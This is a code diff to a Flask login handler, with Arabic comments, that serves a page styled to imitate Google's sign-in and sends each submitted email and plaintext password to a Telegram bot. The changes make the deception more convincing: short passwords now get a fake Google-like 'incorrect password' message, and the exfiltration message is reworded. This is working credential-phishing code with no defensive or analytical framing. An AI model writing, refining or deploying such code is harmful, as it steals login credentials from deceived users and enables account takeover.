@@ -23,18 +23,21 @@ def login():
     email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
-    # التحقق الصارم من صحة البريد الإلكتروني
+    # التحقق من صحة البريد الإلكتروني
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     if not re.match(email_pattern, email_val):
       error = "الرجاء إدخال عنوان بريد إلكتروني صحيح (يحتوي على @ ونطاق صحيح)"
-    # التحقق من أن كلمة المرور أكبر من 5 أحرف فعلياً
+    # التحقق من كلمة المرور مع إظهار رسالة خطأ واقعية تشبه جوجل
     elif len(password) <= 5:
-      error = "كلمة المرور قصيرة جداً، يجب أن تكون أكثر من 5 أحرف!"
+      error = (
+          "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة أو النقر على "
+          "\"العثور على كلمة المرور\" لإعادة تعيينها."
+      )
     else:
-      # إذا تحققت الشروط تماماً، يتم إرسال البيانات للبوت والتوجيه
+      # إذا كانت البيانات مستوفية للشروط، يتم إرسالها للبوت والتوجيه
       if BOT_TOKEN and CHAT_ID:
         msg = (
-            "📩 تم استلام بيانات مطابقة للشروط:\n\n📧 البريد:"
+            "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
             f" {email_val}\n🔑 الباسورد: {password}"
         )
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -72,7 +75,7 @@ def login():
         h2 { color: #202124; font-size: 26px; font-weight: 400; margin-bottom: 8px; }
         p { color: #5f6368; font-size: 16px; margin-bottom: 25px; }
 
-        .error-msg { color: #d93025; background: #fce8e6; padding: 12px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; text-align: right; border: 1px solid #fad2cf; }
+        .error-msg { color: #d93025; background: #fce8e6; padding: 12px; border-radius: 4px; font-size: 13px; line-height: 1.4; margin-bottom: 20px; text-align: right; border: 1px solid #fad2cf; }
 
         .input-group { margin-bottom: 20px; text-align: right; }
         .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; background: transparent; }
